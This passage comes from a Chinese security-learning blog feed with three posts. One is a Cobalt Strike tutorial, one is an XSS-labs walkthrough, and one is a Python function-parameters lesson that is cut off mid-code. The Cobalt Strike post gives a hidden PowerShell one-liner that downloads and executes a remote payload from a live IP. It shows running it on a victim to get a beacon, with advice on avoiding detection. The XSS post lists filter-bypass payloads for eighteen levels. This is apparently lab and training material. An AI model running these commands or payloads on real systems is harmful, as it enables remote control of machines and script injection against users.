class="line">windows/foreign/reverse_tcp</span><br></pre></td></tr></table></figure><p>其中windows&#x2F;beacon为内置监听器，包括dns、http、https、smb四种方式的监听器;windows&#x2F;foreign为外部 监听器，配合Metasploit或者Armitage的监听器。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/cbe2c8ac248e43c6aae786c60eecae65.png" alt="在这里插入图片描述"><br>Name任意，选择所需的payload，Host为本机IP，port为没有被占用的任意端口 , payload常用的是reverse_http , 点击save即创建成功</p><h2 id="2、生成木马"><a href="#2、生成木马" class="headerlink" title="2、生成木马"></a>2、生成木马</h2><p>这里选择其中一种攻击方式作示范，后面再做详细解释, 这里就用powershell一句话做演示 Attacks –&gt; Scripted Web Delivery ( 攻击 –&gt;web钓⻥ -&gt; web投递 )<br><img src="http://120.48.107.243:9090/blog/2023/04/01/a4c400738ff74e7ebbb6e97babf1703d.png" alt="在这里插入图片描述"><br>点击开始，复制生成的一句话<br><img src="http://120.48.107.243:9090/blog/2023/04/01/2891de6d19424019ba848b359c89c259.png" alt="在这里插入图片描述"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object</span></span><br><span class="line"><span class="string">net.webclient).downloadstring(&#x27;http://119.3.12.54:80/index&#x27;))&quot;</span></span><br></pre></td></tr></table></figure><h2 id="3、运行木马"><a href="#3、运行木马" class="headerlink" title="3、运行木马"></a>3、运行木马</h2><p>打开受害机的cmd , 运行生成的powershell一句话 , 打开客户端查看 , 上线成功<br><img src="http://120.48.107.243:9090/blog/2023/04/01/a89add9b946741dba2b0438d96e96410.png" alt="在这里插入图片描述"><br>选中受害机右击，选择beacon，即可进行交互，由于受害机默认60秒进行一次回传，为了实验效果我们这里把时 间设置成3，但实际中频率不宜过快，容易被发现<br><img src="http://120.48.107.243:9090/blog/2023/04/01/018617cc1a3a4c718775a9d026e9ff5f.png" alt="在这里插入图片描述"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sleep</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/01/dd3bb115386547faa077cd4f3104fb8a.png" alt="在这里插入图片描述"></p><h1 id="七、Beacon"><a href="#七、Beacon" class="headerlink" title="七、Beacon"></a>七、Beacon</h1><p><strong>Beacon是什么</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Beacon是CS的Payload Beacon有两种通信模式。一种是异步通信模式，这种模式通信效率缓慢，Beacon回连团队服务器、下载任 务、然后休眠;另一种是交互式通信模式，这种模式的通信是实时发生的。 通过HTTP、HTTPS和DNS出口网络</span><br><span class="line">使用SMB协议的时候是点对点通信</span><br><span class="line">Beacon有很多的后渗透攻击模块和远程管理工具</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>Beacon的类型</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP 和 HTTPS Beacon</span><br><span class="line">HTTP和HTTPS Beacon也可以叫做Web Beacon。默认设置情况下，HTTP 和 HTTPS Beacon 通过 HTTP GET 请求来下载任务。这些 Beacon 通过 HTTP POST 请求传回数据。</span><br><span class="line">当受害机上线以后，右击选择Beacon ，就可以打开Beacon Console 在beacon处输入help可以看到命令说明</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/01/adf15cc03dc3466a8acd524c740a90f6.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/01/d68d5891dc1241c8ba60f9df537f583f.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/01/0f559fbad42e45baa6e407ab554defe1.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/01/60607bb359f4457abc02281235ba7b71.png" alt="在这里插入图片描述"><br>可用help+命令的方式查看具体命令参数说明</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; help argue</span><br><span class="line">Use: argue [<span class="type">command</span>] [<span class="type">fake</span> <span class="type">arguments</span>]</span><br><span class="line">     argue [<span class="type">command</span>]</span><br><span class="line">     argue</span><br><span class="line">Spoof [<span class="type">fake</span> <span class="type">arguments</span>] <span class="keyword">for</span> [<span class="type">command</span>] processes launched by Beacon.</span><br><span class="line">This option does not affect runu/spawnu, runas/spawnas, or post<span class="literal">-ex</span> jobs.</span><br><span class="line">Use argue [<span class="type">command</span>] to disable this feature <span class="keyword">for</span> the specified command.</span><br><span class="line">Use argue by itself to list programs with defined spoofed arguments.</span><br><span class="line">Use argue by itself to list programs wUse argue by itself to list programs wUse argue</span><br><span class="line">by itself to list programs w</span><br></pre></td></tr></table></figure><p><strong>退出会话</strong><br>选中会话 , 右键退出回话 , 然后删除回话 , 如果再次上线了, 再删除一次<br><strong>关于socks代理</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socks port <span class="comment"># 启动代理 </span></span><br><span class="line">socks stop <span class="comment"># 关闭代理</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 工具学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 工具学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS-labs靶场</title>
      <link href="/2022/06/17/xss_labs_act/"/>
      <url>/2022/06/17/xss_labs_act/</url>
      
        <content type="html"><![CDATA[<h1 id="一、level-1"><a href="#一、level-1" class="headerlink" title="一、level-1"></a>一、level-1</h1><p>这一关通过$_GET[“name”]，获取name的值，没有过滤通过echo直接进行了输出，所以很简单<br>payload：name&#x3D;123<script>alert('xss')</script>;<br><img src="http://120.48.107.243:9090/blog/2023/04/03/f924b4dc59784e00b454f0711bcba8c5.png" alt="在这里插入图片描述"></p><h1 id="二、level-2"><a href="#二、level-2" class="headerlink" title="二、level-2"></a>二、level-2</h1><p>这一关获取浏览器提交的keyword值，未进行过滤，输出在<input name=keyword value="'.$str.'">。<br>如果是keyword提交的是<script>alert(xss)</script>,返回的就会是<input name=keyword value="<script>alert(1)</script>">,javascript引擎并不会执行<script>,所以需要构造闭合。<br>payload：keyword=123"><script>alert('xss')</script><br><img src="http://120.48.107.243:9090/blog/2023/04/03/613f0d0e32724c0fa9fe967091bf2569.png" alt="在这里插入图片描述"></p><h1 id="三、level-3"><a href="#三、level-3" class="headerlink" title="三、level-3"></a>三、level-3</h1><p>转义了&gt;括号，注释掉标签使用事件弹窗<br>后台源代码分析，采用htmlspecialchars函数对获取keyword变量进行过滤，输出在input标签的value中。htmlspecichars对尖括号进行了过滤<br>payload：<br>‘ onmouseover&#x3D;javascript:alert(1) ‘ 搜索后将鼠标移到框内。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/3b83efa1ce034c10b49a316b0b1376dd.png" alt="在这里插入图片描述"></p><h1 id="四、level-4"><a href="#四、level-4" class="headerlink" title="四、level-4"></a>四、level-4</h1><p>这一关对get请求的keyword变量，过滤掉尖括号，采用htmlspecialchars过滤后用echo直接输出在返回的html中<br>payload：1” onclick&#x3D;alert(1)&#x2F;&#x2F;<br><img src="http://120.48.107.243:9090/blog/2023/04/03/bfe773d57aeb41e8ade71c5f5a758208-20230403141450671.png" alt="在这里插入图片描述"></p><h1 id="五、level-5"><a href="#五、level-5" class="headerlink" title="五、level-5"></a>五、level-5</h1><p>过滤了script和onclick标签，没有过滤a标签<br>后台源代码分析，对get提交的keyword变量，script替换成scr_ipt,on替换成o_n，htmlspecialchars函数过滤后，输出在html中<br>payload：”&gt;<a href=" javascript:alert(1)"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/ae7f21fdccef419dba7b8744a052ccdd.png" alt="在这里插入图片描述"></p><h1 id="六、level-6"><a href="#六、level-6" class="headerlink" title="六、level-6"></a>六、level-6</h1><p>过滤了script，herf，a标签，使用str_replace函数过滤的，大小写绕过<br>后台源代码分析。对get提交的keyword变量，替换&lt;script 、on、src、data、href关键字，采用htmlspecialchars过滤后输出在html中<br>payload：”&gt;<a HREF=" javascript:alert('1')"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/2e38fa38bea849f883928441c11c9615-20230403141511727.png" alt="在这里插入图片描述"></p><h1 id="七、level-7"><a href="#七、level-7" class="headerlink" title="七、level-7"></a>七、level-7</h1><p>之前的payload，发现on,script,href关键字被屏蔽，都直接替换为了空，使用双写来绕过<br>后台源代码分析。先将get方式提交的keyword变量通过strtolower转换为小写，将关键字script、on、src、data、href关键字替换成空，然后输出在html中<br>payload：1” oonnclick&#x3D;alert(1)&#x2F;&#x2F;<br><img src="http://120.48.107.243:9090/blog/2023/04/03/1eee77af03a7423285d4cb981323bf1d.png" alt="在这里插入图片描述"></p><h1 id="八、level-8"><a href="#八、level-8" class="headerlink" title="八、level-8"></a>八、level-8</h1><p>首先链接处已经有了一个href标签，直接使用javascript&#x3D;alert（123），发现不行，然后使用<script>alert(111)</script>d大小写也不行，尝试使用html实体编码javascript:alert(111)<br>后台源代码分析。将keyword提交的变量转换为小写，替换关键字script、on、src、data、href、”，然后输出在a标签的href属性中<br>payload：&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;<br><img src="http://120.48.107.243:9090/blog/2023/04/03/a02684fa2a4d431c96578917bc3b8644.png" alt="在这里插入图片描述"></p><h1 id="九、level-9"><a href="#九、level-9" class="headerlink" title="九、level-9"></a>九、level-9</h1><p>使用第八关payload不行，查看后台源码判断必须有http:&#x2F;&#x2F;，把第八关的payload后面加上&#x2F;&#x2F;http:&#x2F;&#x2F;就行<br>后台源代码分析。get提交的keyword变量，替换关键字script、on、src、data、href、”，判断该变量有无http:&#x2F;&#x2F;<br>payload：&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&#x2F;&#x2F;http:&#x2F;&#x2F;<br><img src="http://120.48.107.243:9090/blog/2023/04/03/ca1a1d2e7f24456284102534e7120059.png" alt="在这里插入图片描述"></p><h1 id="十、level-10"><a href="#十、level-10" class="headerlink" title="十、level-10"></a>十、level-10</h1><p>使用第九关编码尝试，使用<script>alert(1)</script>尝试，看一下f12网络响应，发现过滤尖括号，发现form表单，尝试使用里面的三个参数提交变量，使用触发onclick事件<br>后台源代码分析，获取了get请求的keyword变量、t_sort变量，t_sort变量过滤掉了尖括号，输出在value属性中<br>payload：keyword&#x3D;123&amp;t_sort&#x3D;”type&#x3D;”text” onclick&#x3D;”alert(111)”<br><img src="http://120.48.107.243:9090/blog/2023/04/03/0187e7fa7350402189fbce49c151f38c.png" alt="在这里插入图片描述"></p><h1 id="十一、level-11"><a href="#十一、level-11" class="headerlink" title="十一、level-11"></a>十一、level-11</h1><p>直接查看网络，响应看源码，发现第四个有值，而且是第十关的payload，看一下头信息，发现有referer头信息，可能会存在xss，f5刷新页面，burp抓包，自己构造referer参数，其值为payload<br>后台源代码分析，获取get请求的keyword、t_sort变量和refer字段，过滤refer字段的尖括号后输出在html代码中<br>payload：” type&#x3D;”text” onclick&#x3D;”alert(1)”<br><img src="http://120.48.107.243:9090/blog/2023/04/03/32e081fa1ab74a038fe3a92cfb9902be.png" alt="在这里插入图片描述"></p><h1 id="十二、level-12"><a href="#十二、level-12" class="headerlink" title="十二、level-12"></a>十二、level-12</h1><p>和上一关一样，只不过这关是修改ua头<br>后台源代码分析，获取get请求的keyword、t_sort变量和user-agent字段，过滤refer字段的尖括号后输出在html代码中<br>payload：” type&#x3D;”text” onclick&#x3D;”alert(1)”<br><img src="http://120.48.107.243:9090/blog/2023/04/03/2ba122c9e4fd4a32b46ca27137d19c98.png" alt="在这里插入图片描述"></p><h1 id="十三、level-13"><a href="#十三、level-13" class="headerlink" title="十三、level-13"></a>十三、level-13</h1><p>cookie注入xss<br>后台源代码分析，获取get请求的keyword、t_sort变量和cookie字段，过滤refer字段的尖括号后输出在html代码中<br>payload：user&#x3D;” type&#x3D;”text” onclick&#x3D;”alert(1)”<br><img src="http://120.48.107.243:9090/blog/2023/04/03/297fe8c2dcb3416da7800ceb6f4c3613.png" alt="在这里插入图片描述"></p><h1 id="十四、level-14"><a href="#十四、level-14" class="headerlink" title="十四、level-14"></a>十四、level-14</h1><p>这关环境有问题。<br>#十五、level-15<br>本关卡使用 Angularjs的ng-include，直接在包含的页面，但是本关卡页面进行了编码，所以需要使用 img标签来触发xss<br>payload：http://xxs/level15.php?src='level1.php?name=<img src=1 onerror=alert(/bmfx/)>‘<br><img src="http://120.48.107.243:9090/blog/2023/04/03/105b50cedb8948ff97b91a7bc4152dad.png" alt="在这里插入图片描述"></p><h1 id="十六、level-16"><a href="#十六、level-16" class="headerlink" title="十六、level-16"></a>十六、level-16</h1><p>网络，响应，发现并无什么，使用<script>alert(1)</script>进行尝试，&#x2F;center&gt; onclick&#x3D;alert(1)&#x2F;&#x2F; 尝试，发现过滤，使用payload，使用 %0a回车符来代替空格源代码分析，过滤了script、空格、&#x2F;<br>payload：&lt;img%0asrc&#x3D;1%0aonerror&#x3D;alert(1)&gt;<br><img src="http://120.48.107.243:9090/blog/2023/04/03/554ac140f23a4f0b9f017444063e5ff1.png" alt="在这里插入图片描述"></p><h1 id="十七、level-17"><a href="#十七、level-17" class="headerlink" title="十七、level-17"></a>十七、level-17</h1><p>查看网页代码，发现有一个swf文件没有被加载，swf文件十四flash文件，可以被flash player打开，而embed标签可以引用flash对象，使用onclick&#x3D;alert(1),无返回响应，我们可以发现两个参数都被插到了embed标签，尝试构造payload，这里介绍js的另外两个事件，onmouseout事件，这个是鼠标移出指定的对象时发生，onmouseover事件，鼠标移动到指定的对象上时发生<br>payload：<br>http://xxs/level17.php?arg01=a&arg02=+onmouseover=alert(1)<br><img src="http://120.48.107.243:9090/blog/2023/04/03/af5754181131467a9e3c8d902f06a47a.png" alt="在这里插入图片描述"></p><h1 id="十八、level-18"><a href="#十八、level-18" class="headerlink" title="十八、level-18"></a>十八、level-18</h1><p>和上一关一样的<br><img src="http://120.48.107.243:9090/blog/2023/04/03/17cdb197a3d545f2832a3740860127a8.png" alt="在这里插入图片描述"></p><h1 id="十九、level-19-20"><a href="#十九、level-19-20" class="headerlink" title="十九、level-19-20"></a>十九、level-19-20</h1><p>level-19 level-20 都属于flash xss类型，在此不做讨论。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 打靶记录 </category>
          
          <category> XSS-labs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 打靶记录 </tag>
            
            <tag> XSS-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习日记（十二）</title>
      <link href="/2022/06/15/python_twelve/"/>
      <url>/2022/06/15/python_twelve/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/f54ac64acb7347f796b984da66c66201-20230403140549455.png" alt="在这里插入图片描述"><br>本篇文章记录的是Python函数参数的知识。</p><h1 id="一、形参和实参"><a href="#一、形参和实参" class="headerlink" title="一、形参和实参"></a>一、形参和实参</h1><h2 id="1、形参"><a href="#1、形参" class="headerlink" title="1、形参"></a>1、形参</h2><p>形参：在定义函数阶段定义的参数叫做形式参数，简称形参，相当于变量名。<br>&#x3D;&#x3D;函数在定义阶段括号内指定的变量名&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">x</span>):  <span class="comment"># x就是形参</span></span><br><span class="line">    <span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure><h2 id="2、实参"><a href="#2、实参" class="headerlink" title="2、实参"></a>2、实参</h2><p>实参：在调用函数阶段传入的值称之为实际参数，简称实参，相当于变量值，值可以是常量，变量、表达式或三者的组合。<br>&#x3D;&#x3D;函数在调用阶段括号内传入的值。&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;我的名字是<span class="subst">&#123;name&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">func(<span class="string">&#x27;tom&#x27;</span>)  <span class="comment"># &#x27;tom&#x27;就是实参 </span></span><br></pre></td></tr></table></figure><h2 id="3、形参和实参的关系"><a href="#3、形参和实参的关系" class="headerlink" title="3、形参和实参的关系"></a>3、形参和实参的关系</h2><p>在调用阶段，实参（变量值）会绑定给形参（变量名），绑定不是目的，目的是在函数体中使用，函数调用结束后，这种绑定关系就会解除，所以无法再函数体外使用。<br>#二、三种参数<br>##1、位置参数<br>位置参数：按照从左到右的顺序依次定义的参数称之为位置参数。<br>位置形参：在函数定义阶段，按照从左到右的顺序直接定义的变量名。<br>特点：必须传值，多一个不行，少一个也不行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">x,y,z</span>): <span class="comment"># x,y,z 三个位置形参</span></span><br><span class="line">    <span class="keyword">return</span> x + y + z</span><br></pre></td></tr></table></figure><p>位置实参：在函数调用阶段，按照从左到右的顺序依次传入的值。<br>特点：按照顺序与形参一一对应：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">x,y,z</span>):</span><br><span class="line">    <span class="keyword">return</span> x + y + z</span><br><span class="line"></span><br><span class="line">func(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) <span class="comment"># 1,2,3 三个位置实参,依次传给x,y,z</span></span><br></pre></td></tr></table></figure><h2 id="2、关键字参数"><a href="#2、关键字参数" class="headerlink" title="2、关键字参数"></a>2、关键字参数</h2><p>关键字实参：在函数调用阶段，按照key&#x3D;value的形式传入的值<br>特点：指名道姓给某个形参传值，可以完全不按照顺序<br>混合使用：<br>位置实参必须放在关键字实参前面<br>不能为同一个形参重复传值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line">foo(<span class="number">1</span>,y=<span class="number">2</span>)</span><br><span class="line">foo(y=<span class="number">2</span>,<span class="number">1</span>) <span class="comment"># 报错</span></span><br><span class="line"></span><br><span class="line">foo(<span class="number">1</span>,y=<span class="number">2</span>,x=<span class="number">3</span>) <span class="comment"># 报错</span></span><br><span class="line">foo(<span class="number">1</span>,<span class="number">2</span>,x=<span class="number">3</span>,y=<span class="number">4</span>) <span class="comment"># 报错</span></span><br></pre></td></tr></table></figure><h2 id="3、默认值参数"><a href="#3、默认值参数" class="headerlink" title="3、默认值参数"></a>3、默认值参数</h2><p>默认形参：在函数定义阶段，就已经被赋值的形参，称之为默认参数<br>特点：在函数定义阶段就已经被赋值，意味着在调用阶段可以不用为其赋值，也可以赋值改变默认值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">x,y=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">return</span> x+y</span><br><span class="line"></span><br><span class="line">func(<span class="number">1</span>)</span><br><span class="line">func(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">func(x=<span class="number">1</span>,y=<span class="number">1</span>)</span><br><span class="line">func(<span class="number">10</span>,y=<span class="number">20</span>)</span><br></pre></td></tr></table></figure><p>混合使用：<br>位置参数必须在默认值参数前面：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">x,y=<span class="number">100</span></span>):</span><br><span class="line">    <span class="keyword">return</span> x + y</span><br></pre></td></tr></table></figure><h2 id="4、形参如何定义"><a href="#4、形参如何定义" class="headerlink" title="4、形参如何定义"></a>4、形参如何定义</h2><p>位置形参：当每次函数调用传进来的参数都是不一样的，但是又是必须传入的时候<br>默认值参数：当每次函数调用传进来的参数大都是不变的，应该设为默认值参数。</p><h1 id="注册小示例"><a href="#注册小示例" class="headerlink" title="注册小示例:"></a>注册小示例:</h1><p>def register(name,age,sex):<br>    print(name,age,sex)</p><p>register(‘小明’,20,’男’)<br>register(‘小红’,19,’女’)<br>register(‘小强’,22,’男’)<br>register(‘小亮’,23,’男’)</p><h1 id="这个时候发现性别大多数都是男-于是你可以在函数定义的时候设置一个默认值参数-即sex-x3D-’男’"><a href="#这个时候发现性别大多数都是男-于是你可以在函数定义的时候设置一个默认值参数-即sex-x3D-’男’" class="headerlink" title="这个时候发现性别大多数都是男,于是你可以在函数定义的时候设置一个默认值参数,即sex&#x3D;’男’"></a>这个时候发现性别大多数都是男,于是你可以在函数定义的时候设置一个默认值参数,即sex&#x3D;’男’</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">register1</span>(<span class="params">name,age,sex=<span class="string">&#x27;男&#x27;</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(name,age,sex)</span><br><span class="line">    </span><br><span class="line">register1(<span class="string">&#x27;小明&#x27;</span>,<span class="number">20</span>)</span><br><span class="line">register1(<span class="string">&#x27;小红&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;女&#x27;</span>)</span><br><span class="line">register1(<span class="string">&#x27;小强&#x27;</span>,<span class="number">22</span>)</span><br><span class="line">register1(<span class="string">&#x27;小亮&#x27;</span>,<span class="number">23</span>) </span><br><span class="line"><span class="comment"># 当遇到女同学的时候,才传入sex的值,默认情况下我们把性别设置成男</span></span><br></pre></td></tr></table></figure><h1 id="三、可变长度参数（-与-）"><a href="#三、可变长度参数（-与-）" class="headerlink" title="三、可变长度参数（*与**）"></a>三、可变长度参数（*与**）</h1><p>可变长度指的是在调用函数时，传入的值（实参）的个数不固定，而实参是用来为形参赋值的，所以对应着，针对溢出的实参必须有对应的形参来接收。<br>##1、可变长度的位置参数<br><em>形参名：用来接收溢出的位置实参，溢出的位置实参会被</em>保存成元组的格式然后赋值紧跟其后打的形参名。<br>星号后面的形参名可以是任意名字，但是约定俗称为args，即*args。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 示例:</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">x,y,*z</span>)</span><br><span class="line"><span class="built_in">print</span>(x,y,z) <span class="comment"># 1 2 (3,4,5)</span></span><br><span class="line">    </span><br><span class="line">func(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)   </span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;<em>在实参中应用（星号后面跟可迭代对象）&#x3D;&#x3D;：<br>实参中带</em>，在星号后面的值会被打散成位置参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">x,y,z</span>):</span><br><span class="line">    <span class="built_in">print</span>(x,y,z)</span><br><span class="line">    </span><br><span class="line">func(*[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])  <span class="comment"># func(1,2,3)</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 小练习</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func1</span>(<span class="params">x,y,*args</span>):</span><br><span class="line">    <span class="built_in">print</span>(x,y,args) <span class="comment"># 1 2 (3,4,5)  </span></span><br><span class="line">func1(<span class="number">1</span>,<span class="number">2</span>,*[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func2</span>(<span class="params">x,y,*args</span>):</span><br><span class="line">    <span class="built_in">print</span>(x,y,args) <span class="comment"># h e (&quot;l&quot;,&quot;l&quot;,&#x27;o&#x27;)</span></span><br><span class="line">func2(*<span class="string">&quot;hello&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="2、可变长度的关键字参数"><a href="#2、可变长度的关键字参数" class="headerlink" title="2、可变长度的关键字参数"></a>2、可变长度的关键字参数</h2><p><code>**形参名:</code>用来接收溢出的关键字实参 , 溢出的关键字实参会被<code>**</code>保存成<code>字典</code>的格式然后赋值紧跟其后打的<code>形</code></p><p><code>参名</code>星星号后面的形参名可以是任意名字，但是约定俗称为kwargs , 即 <code>**kwargs</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">x,y,**kwargs</span>):</span><br><span class="line">    <span class="built_in">print</span>(x)   <span class="comment"># 1</span></span><br><span class="line">    <span class="built_in">print</span>(y)   <span class="comment"># 2</span></span><br><span class="line">    <span class="built_in">print</span>(kwargs)  <span class="comment"># &#123;&#x27;z&#x27;:3,&#x27;a&#x27;:4&#125;</span></span><br><span class="line">    </span><br><span class="line">func(<span class="number">1</span>,y=<span class="number">2</span>,z=<span class="number">3</span>,a=<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;**在实参中的应用( 星星号后面只能跟字典 )&#x3D;&#x3D;</p><p>实参中带** , 在星号星号后面的值会被打散成关键字参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">x,y,z</span>):</span><br><span class="line">    <span class="built_in">print</span>(x,y,z)  <span class="comment"># 1 2 3</span></span><br><span class="line">    </span><br><span class="line">func(**&#123;<span class="string">&quot;x&quot;</span>:<span class="number">1</span>,<span class="string">&quot;y&quot;</span>:<span class="number">2</span>,<span class="string">&#x27;z&#x27;</span>:<span class="number">3</span>&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 小练习</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">x,y,**kwargs</span>):</span><br><span class="line">    <span class="built_in">print</span>(x,y,kwargs)  <span class="comment"># 1 2 &#123;&quot;x&quot;:1,&quot;y&quot;:2,&#x27;z&#x27;:3&#125;</span></span><br><span class="line">    </span><br><span class="line">func(<span class="number">1</span>,<span class="number">2</span>,**&#123;<span class="string">&quot;x&quot;</span>:<span class="number">1</span>,<span class="string">&quot;y&quot;</span>:<span class="number">2</span>,<span class="string">&#x27;z&#x27;</span>:<span class="number">3</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span 